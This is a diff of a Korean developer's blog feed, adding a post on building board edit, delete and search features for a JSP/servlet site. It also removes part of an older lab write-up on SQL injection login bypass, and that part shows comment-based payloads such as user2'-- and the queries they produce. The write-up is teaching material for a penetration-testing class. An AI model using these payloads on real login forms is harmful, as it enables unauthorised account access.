@@ -1,35 +1,125 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-08T01:30:31+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTCArIOyVheyEsSDsiqTtgazrpr3tirjrpbwg7KCE64us7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkzsnYQg7YG066at7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Drpbwg7JqU7LKt7ZWc64ukLlxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDtjpjsnbTsp4Drpbwg7J2R64u17ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiDslYXshLEg7Iqk7YGs66a97Yq47JeQIOydmO2VtCDtjpjsnbTsp4Ag6rWs7KGw6rCAIOuPmeyggeycvOuhnCDrs4DtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOqzteqyqeyekCA6IOuvvOqwkO2VnCDrjbDsnbTthLDrpbwg7KCE7Iah7ZWc64ukLiIsIm1lcm1haWQiOm51bGx9" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-10T21:49:29+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹서버 만들기(11) 게시글 수정, 삭제, 검색</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/" rel="alternate" type="text/html" title="웹서버 만들기(11) 게시글 수정, 삭제, 검색" /><published>2023-05-10T00:00:00+09:00</published><updated>2023-05-10T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/"><![CDATA[<h2 id="게시글-수정">게시글 수정</h2>
+<ul>
+  <li>자기가 쓴 글만 수정이 가능하다.</li>
+  <li><code class="language-plaintext highlighter-rouge">수정하기</code>버튼을 클릭하면 게시글 수정 페이지가 나타난다.</li>
+  <li><code class="language-plaintext highlighter-rouge">수정하기</code>버튼은 자기가 쓴 게시글에만 표시가 된다.</li>
+</ul>
 
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IExSXG5BW-qzteqyqeyekF0gLS0-fOyVheydmOyggeyduCDsiqTtgazrpr3tirjrpbwg64Sj7J2AIOqyjOyLnOq4gOydhCDsnpHshLHtlZzri6R8IEJb7ISc67KEXTtcbkNb7IKs7Jqp7J6QXSAtLT587IKs7Jqp7J6Q6rCAIOyVheydmOyggeyduCDsiqTtgazrpr3tirjqsIAg7J6I64qUIOqyjOyLnOq4gOydhCDsmpTssq3tlZzri6R8IEJb7ISc67KEXVxuQlvshJzrsoRdIC0tPiB86rKM7Iuc6riA7J2EIOydkeuLteycvOuhnCDrs7Trgrjri6R8IENb7IKs7Jqp7J6QXVxuQ1vsgqzsmqnsnpBdIC0tPiB86rO16rKp7J6Q64qUIOyCrOyaqeyekOuhnOu2gO2EsCDrr7zqsJDtlZwg642w7J207YSw66W8IOuwm-uKlOuLpC58IEFb6rO16rKp7J6QXSIsIm1lcm1haWQiOm51bGx9" /></p>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b1a6850c-b07e-4c20-826c-2224bccda626" alt="Pasted image 20230510145616" /></p>
 
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5CW-yEnOuyhF0gLS0-IHzqsozsi5zquIDsnYQg7J2R64u17Jy866GcIOuztOuCuOuLpHwgQ1vsgqzsmqnsnpBdXG5BW-qzteqyqeyekF0gLS0-fOyVheydmOyggeyduCDsiqTtgazrpr3tirjrpbwg64Sj7J2AIOqyjOyLnOq4gOydhCDsnpHshLHtlZzri6R8IEJb7ISc67KEXTtcbkNb7IKs7Jqp7J6QXSAtLT587IKs7Jqp7J6Q6rCAIOyVheydmOyggeyduCDsiqTtgazrpr3tirjqsIAg7J6I64qUIOqyjOyLnOq4gOydhCDsmpTssq3tlZzri6R8IEJb7ISc67KEXVxuQ1vsgqzsmqnsnpBdIC0tPiB86rO16rKp7J6Q64qUIOyCrOyaqeyekOuhnOu2gO2EsCDrr7zqsJDtlZwg642w7J207YSw66W8IOuwm-uKlOuLpC58IEFb6rO16rKp7J6QXSIsIm1lcm1haWQiOm51bGx9" /></p>
+<h3 id="수정하기-페이지">수정하기 페이지</h3>
+<ul>
+  <li>수정하기 버튼을 클릭하면 글을 수정할 수 있는 페이지가 나타난다.</li>
+  <li>해당 페이지에는 현재 게시글의 제목과 본문이 적혀있다.</li>
+  <li>내용을 수정하고 저장 버튼을 누르면 게시글을 수정할 수 있다.</li>
+  <li>게시글 수정 페이지는 게시글 새로 작성하기와 코드가 동일하다. 단지 옛 게시글을 가져와 표시해준다.</li>
+</ul>
 
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /></p>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4652763b-44fc-4699-b1ce-6dcacab8f204" alt="Pasted image 20230510150536" /></p>
 
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog66Gc6re47JWE7JuDIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiBzZXNzaW9uIGlkIOyCreygnFxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOuhnOq3uOyduCDtjpjsnbTsp4Dso7zshowg66as64uk7J2066CJ7Yq4IOydkeuLtVxu7IKs7Jqp7J6QKOu4jOudvOyasOyggCkgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCjruIzrnbzsmrDsoIApIDog66Gc6re47J24IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
+<h3 id="게시글-수정-저장-과정">게시글 수정 저장 과정</h3>
+<ol>
+  <li>자기가 쓴 글의 수정하기 페이지에 들어간다.</li>
+  <li>내용을 수정하고 저장 버튼을 누른다.</li>
+  <li>서버에서 옛날에 쓴 게시글은 삭제하고 새로운 게시글 형태로 저장한다.</li>
+</ol>
 
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.mingyu2.login</span><span class="o">;</span>
+<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-ICDshJzrsoQgOiDsiJjsoJUg7KCV67O0IOyghOuLrFxu7ISc67KEIC0-PiDshJzrsoQgOiDsiJjsoJUg7JqU7LKt7J6Q7JmAIOqyjOyLnOq4gCDsoIDsnpDqsIAg7J287LmY7ZWY64qU7KeAIO2ZleyduFxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDsmJsg6rKM7Iuc6riAIOyCreygnCDsmpTssq1cbkRCIOyEnOuyhCAtPj4g7ISc67KEIDog7JmE66OMXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOyDiOuhnOyatCDqsozsi5zquIAg7KCA7J6lIOyalOyyrVxuREIg7ISc67KEIC0-PiDshJzrsoQgOiDsmYTro4xcbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIO2OmOydtOyngOuhnCDrpqzri6TsnbTroIntirgiLCJtZXJtYWlkIjpudWxsfQ" /></p>
 
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Logout</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span><span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="nd">@Override</span>
-<span class="err"> </span> <span class="err"> </span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">ServletException</span><span class="o">,</span> <span class="nc">IOException</span> <span class="o">{</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getRequestURI</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">// 로그아웃 요청이 아니면 실패</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(!</span><span class="n">uri</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"/user-logout"</span><span class="o">)){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kd">super</span><span class="o">.</span><span class="na">doGet</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">return</span><span class="o">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="kt">var</span> <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span><span class="o">(</span><span class="n">session</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">session</span><span class="o">.</span><span class="na">invalidate</span><span class="o">();</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="s">"/sign_in_page"</span><span class="o">);</span>
-<span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></div></div>
-<blockquote>
-  <p>test</p>
-</blockquote>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL Injection 정리</title><link href="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="SQL Injection 정리" /><published>2023-05-08T00:00:00+09:00</published><updated>2023-05-08T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="sql-injection">SQL Injection</h2>
+<h3 id="게시글-수정-전">게시글 수정 전</h3>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5c185a23-00ed-4809-85fa-7cbef5849e37" alt="Pasted image 20230510172026" /></p>
+
+<h3 id="게시글-수정-후">게시글 수정 후</h3>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/252dcf4a-f525-4b23-8163-fa613dcc1e6a" alt="Pasted image 20230510172058" /></p>
+
+<h2 id="게시글-삭제">게시글 삭제</h2>
+<ul>
+  <li>자기가 쓴 글만 삭제가 가능하다.</li>
+  <li><code class="language-plaintext highlighter-rouge">삭제하기</code>버튼을 누르면 게시글이 삭제된다.</li>
+  <li><code class="language-plaintext highlighter-rouge">삭제하기</code>버튼은 자기가 쓴 게시글에만 표시가 된다.</li>
+</ul>
+
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/aa96aad4-ecec-40e3-a2bb-6d3d6f14a101" alt="Pasted image 20230510145618" /></p>
+
+<h3 id="게시글-삭제-과정">게시글 삭제 과정</h3>
+<ol>
+  <li>자기가 쓴 게시글을 클릭하여 들어간다.</li>
+  <li>삭제하기 버튼을 클릭한다.</li>
+  <li>서버에서 게시글을 삭제한다.</li>
+</ol>
+
+<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyCreygnCDsmpTssq3snpDsmYAg6rKM7Iuc6riAIOyggOyekOqwgCDsnbzsuZjtlZjripTsp4Ag7ZmV7J24XG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOyZhOujjFxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg66qp66GdIO2OmOydtOyngOuhnCDrpqzri6TsnbTroIntirgiLCJtZXJtYWlkIjpudWxsfQ" /></p>
+
+<h3 id="게시글-삭제-전-db">게시글 삭제 전 DB</h3>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/217f8cbe-2ba0-4523-8b8d-89735152c7c6" alt="Pasted image 20230510180241" /></p>
+
+<h3 id="게시글-삭제-후-db">게시글 삭제 후 DB</h3>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/29ca56bc-0173-4c34-a922-c21dce25d277" alt="Pasted image 20230510180336" /></p>
+
+<h2 id="게시글-검색">게시글 검색</h2>
+<ul>
+  <li>제목 또는 본문에 일치하는 문장이 존재하면 게시글 목록에 나타난다.<br />
+<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/489ecabe-e9e2-47a6-b49b-2fb791f72dd9" alt="Pasted image 20230510180753" /></li>
+</ul>
+
+<h3 id="게시글-검색-과정">게시글 검색 과정</h3>
+<ol>
+  <li>검색바에 검색할 문장을 적어준다.</li>
+  <li>엔터키를 눌러주면 서버로 검색 문장이 전송된다.</li>
+  <li>서버에서 검색 문장과 일치하는 목록을 찾아 게시판 페이지를 완성하여 사용자에게 보내준다.</li>
+</ol>
+
+<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>
+
+<h3 id="게시판-검색-전">게시판 검색 전</h3>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b363eda5-a151-46d4-a4f1-3bcb6ed13cf5" alt="Pasted image 20230510182928" /></p>
+
+<h3 id="게시판-검색-후">게시판 검색 후</h3>
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e3aa24d0-93b3-40a2-83f0-6ab06983cfe7" alt="Pasted image 20230510182949" /></p>
+
+<h2 id="코드">코드</h2>
+<h3 id="jsp">JSP</h3>
+<ul>
+  <li>
+    <p>notice.jsp 의 <code class="language-plaintext highlighter-rouge">수정하기</code> 및  <code class="language-plaintext highlighter-rouge">삭제하기</code> 버튼 부분.
+<script src="https://gist.github.com/MinGyu2/39f0c8de5f8a66a31630dbeb16915406.js"></script></p>
+  </li>
+  <li>
+    <p>notice_write.jsp 게시글 수정하기.
+<script src="https://gist.github.com/MinGyu2/478e9223926016d77ec87888e6f62f27.js"></script></p>
+  </li>
+</ul>
+
+<h3 id="servlet">Servlet</h3>
+<ul>
+  <li>
+    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 수정하기 페이지.
+<script src="https://gist.github.com/MinGyu2/ee292b560cc05e016493d920407ef2dc.js"></script></p>
+  </li>
+  <li>
+    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 수정본 저장하기 버튼 눌렀을 때. 
+<script src="https://gist.github.com/MinGyu2/d0fa86e9427cd19756eda75cf947b229.js"></script></p>
+  </li>
+  <li>
+    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 삭제하기 버튼 눌렀을 때.
+<script src="https://gist.github.com/MinGyu2/20a4a375485e9aa2d629c11278935f94.js"></script></p>
+  </li>
+  <li>
+    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 검색하기 버튼 눌렀을 때.
+<script src="https://gist.github.com/MinGyu2/2e7bb12c785988dd7e4245d4e39d9387.js"></script></p>
+  </li>
+</ul>
+
+<h2 id="웹-서버-전체-코드">웹 서버 전체 코드</h2>
+<h3 id="jsp-1">JSP</h3>
+<ul>
+  <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
+</ul>
+
+<h3 id="servlet-1">servlet</h3>
+<ul>
+  <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="jsp" /><category term="servlet" /><category term="웹 서버" /><summary type="html"><![CDATA[게시글 수정, 삭제, 검색 기능 만들기.]]></summary></entry><entry><title type="html">SQL Injection 정리</title><link href="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="SQL Injection 정리" /><published>2023-05-08T00:00:00+09:00</published><updated>2023-05-08T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="sql-injection">SQL Injection</h2>
 
 <h3 id="개념">개념</h3>
 <ul>
@@ -1139,816 +1229,4 @@
   <li><a href="https://imthekingofcoding.tistory.com/30">JavaScript - 이메일 유효성 검사 (회원가입) (tistory.com)</a></li>
   <li><a href="https://blog.naver.com/PostView.nhn?blogId=seonghun7304&amp;logNo=221583410491">location href를 POST로 보내는 방법</a></li>
   <li><a href="http://www.oncode.co.kr/onbr/brd/board/?pgk=/tip/board/view/1/275&amp;lang=ko">CSS div 안보이게 하는 방법, div hidden, display none</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="Web" /><category term="Oracle DB" /><category term="Java" /><category term="Servlet" /><category term="JSP" /><summary type="html"><![CDATA[회원가입 구현하기.]]></summary></entry><entry><title type="html">SQL Injection 로그인 우회</title><link href="http://localhost:4000/SQLInjection/" rel="alternate" type="text/html" title="SQL Injection 로그인 우회" /><published>2023-04-19T00:00:00+09:00</published><updated>2023-04-19T23:13:00+09:00</updated><id>http://localhost:4000/SQLInjection</id><content type="html" xml:base="http://localhost:4000/SQLInjection/"><![CDATA[<h2 id="sql-injection-이란">SQL Injection 이란?</h2>
-<ul>
-  <li>sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다.</li>
-  <li>웹 해킹 기술중 하나이다.</li>
-</ul>
-
-<blockquote>
-  <p>목적</p>
-  <ul>
-    <li>정보 유출</li>
-    <li>저장된 데이터 유출 및 조작</li>
-    <li>인증 우회</li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p>실습 환경</p>
-  <ul>
-    <li>DB 서버 : Rocky-8.7</li>
-    <li>DB 버전 : oracle-database-xe-21c</li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p><strong>members</strong> 테이블 구조</p>
-</blockquote>
-
-<table>
-  <thead>
-    <tr>
-      <th>sid</th>
-      <th>id</th>
-      <th>password</th>
-      <th>email</th>
-      <th>info</th>
-      <th>hashpwd</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>integer PRIMARY KEY</td>
-      <td>VARCHAR(60)</td>
-      <td>VARCHAR(60)</td>
-      <td>VARCHAR(60)</td>
-      <td>VARCHAR(60)</td>
-      <td>CHAR(128)</td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li><strong>hashpwd</strong> 컬럼은 password를 해시(SHA512) 암호화를 한 것 이다.</li>
-  <li>실제로 유저 정보를 저장하기 위한 테이블을 구성할 때는 해시 암호화된 비밀번호만 저장해야한다.</li>
-</ul>
-
-<p><br /><br /></p>
-<h2 id="로그인-방식에-따른-sql-인젝션-공격방식">로그인 방식에 따른 sql 인젝션 공격방식</h2>
-<ul>
-  <li>식별
-    <ul>
-      <li>많은 데이터 중에서 특별한 데이터를 가려내는것.</li>
-    </ul>
-  </li>
-  <li>인증
-    <ul>
-      <li>그 사람이 맞는지 확인하는 작업. ( 비밀번호 인증 )</li>
-    </ul>
-  </li>
-</ul>
-
-<h4 id="1-식별과-인증을-동시에-할-때">1. 식별과 인증을 동시에 할 때</h4>
-<ul>
-  <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다.</li>
-</ul>
-
-<blockquote>
-  <p>로그인방법</p>
-  <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'아이디'</span> <span class="k">and</span> <span class="n">PASSWORD</span><span class="o">=</span><span class="s1">'비번'</span>
-</code></pre></div>  </div>
-  <ul>
-    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 사용자 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
-    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p>로그인 코드
-<script src="https://gist.github.com/MinGyu2/348f7a0e850908a350bb766f307d8e9a.js"></script></p>
-  <ul>
-    <li>다음 코드를 통해 인증을 한다.
-      <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">var</span> <span class="n">member</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="na">authAndMember</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
-</code></pre></div>      </div>
-    </li>
-  </ul>
-</blockquote>
-
-<blockquote>
-  <p>정상적인 로그인<br />
-<img src="https://user-images.githubusercontent.com/31990118/232983137-92129ab9-a389-43c0-93b9-46e70de832ce.png" alt="Pasted image 20230419141436" /><br /><img src="https://user-images.githubusercontent.com/31990118/232983198-a896785d-032c-47a7-9dac-905c0a7fe3a8.png" alt="Pasted image 20230419141453" /></p>
-</blockquote>
-
-<p><br /></p>
-<blockquote>
-  <p><strong>공격 방법</strong></p>
-</blockquote>
-
-<ul>
-  <li><strong>주석을 이용한 인증우회(1)</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">user2'--</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td>` `</td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
-<code class="language-plaintext highlighter-rouge">select * from members where id='user2'--' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232983978-af5bd6a4-cc9b-4c5b-a130-155f58121b71.png" alt="Pasted image 20230419044643" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984069-0c3d894b-edfe-43c0-a4b2-04349fee4065.png" alt="Pasted image 20230419044620" /></li>
-</ul>
-
-<p><br /></p>
-<ul>
-  <li><strong>주석을 이용한 인증우회(2)</strong></li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th> </th>
-      <th>입력</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>id</td>
-      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
-    </tr>
-    <tr>
-      <td>pwd</td>
-      <td><code class="language-plaintext highlighter-rouge">*/and '1'='1</code></td>
-    </tr>
-  </tbody>
-</table>
-
-<ul>
-  <li>서버에서 완성된 쿼리문<br />
